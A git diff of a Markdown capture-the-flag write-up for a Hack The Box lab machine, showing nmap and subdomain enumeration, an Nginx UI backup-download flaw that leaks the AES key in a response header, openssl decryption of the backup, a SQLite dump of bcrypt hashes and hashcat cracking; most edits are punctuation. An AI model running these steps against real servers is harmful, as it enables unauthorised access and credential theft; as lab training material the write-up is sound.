@@ -1,16 +1,14 @@
-#hard #in-progress #htb
+#in-progress #hard #htb #subdomains #nginx-ui #cve-2026-27944 #backup #decryption #sqlite #bcrypt  #cve-2026-3888 #toctou #race-condition
 # Enumeration
-
 ## Nmap
 
+Open ports: 22,80
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/scan
 ❯ nmap -p 22,80 -sCV -oN portscan.txt 10.129.21.165
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux)
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-title: Snapped \xE2\x80\x94 Infrastructure. Orchestration. Control.
-|_http-server-header: nginx/1.24.0 (Ubuntu)
 ```
 
 ## Subdomains
@@ -18,11 +16,10 @@ PORT   STATE SERVICE VERSION
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/scan
 ❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.snapped.htb" -fw 4 -u http://snapped.htb
-
 admin.snapped.htb            [Status: 200, Size: 950]
 ```
 
-Add the `admin.snapped.htb` subdomain to `/etc/hosts`
+Add the `admin.snapped.htb` subdomain to `/etc/hosts`.
 ```bash
 echo "10.129.21.165 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
 ```
@@ -31,10 +28,9 @@ echo "10.129.21.165 snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
 
 ## Backup download
 
-`admin.snapped.htb` runs **Nigx Ui**, which is vulnerable to backup download ([CVE-2026-27944](https://github.com/advisories/GHSA-g9w5-qffc-6762)):
+`admin.snapped.htb` runs **Nigx Ui**, which is vulnerable to backup download ([CVE-2026-27944](https://github.com/advisories/GHSA-g9w5-qffc-6762)).
 
-Download `backup.zip` from `admin.snapped.htb/api/backup`
-
+Download `backup.zip` from `admin.snapped.htb/api/backup`.
 Backup.zip is encrypted, but the API sends the **AES-256** key via the `X-Backup-Security` header, **base64**-encoded and formatted as `key:iv` .
 
 ```bash
@@ -47,14 +43,13 @@ Backup.zip is encrypted, but the API sends the **AES-256** key via the `X-Backup
 
 ## Backup decryption
 
-Unzip the backup:
+Unzip the backup.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ unzip backup.zip
 ```
 
-Export the decoded `key` and `iv` as environment variables:
-
+Export the decoded `key` and `iv` as environment variables.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ export key=$(echo base64-ecoded_key | base64 -d | xxd -p -c 256)
@@ -67,7 +62,7 @@ Export the decoded `key` and `iv` as environment variables:
 >Key and iv are found in `headers.txt`:
 >`X-Backup-Security: <base64-encoded_key>:<base64-encoded_iv>`
 
-Decrypt the files in `backup.zip`:
+Decrypt the files in `backup.zip`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ openssl enc -d -aes-256-cbc -in ngix-ui.zip -out ngix-ui_dec.zip -K "$key" -iv "$iv"
@@ -92,8 +87,7 @@ sqlite> select id,name,password from users;
 2|jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
 ```
 
-It contains usernames and their hashes in **bcrypt**. We can put it into a file to crack it with `hashcat`:
-
+It contains usernames and their hashes in **bcrypt**. We can put it into a file to crack it with `hashcat`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/s/content
 ❯ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
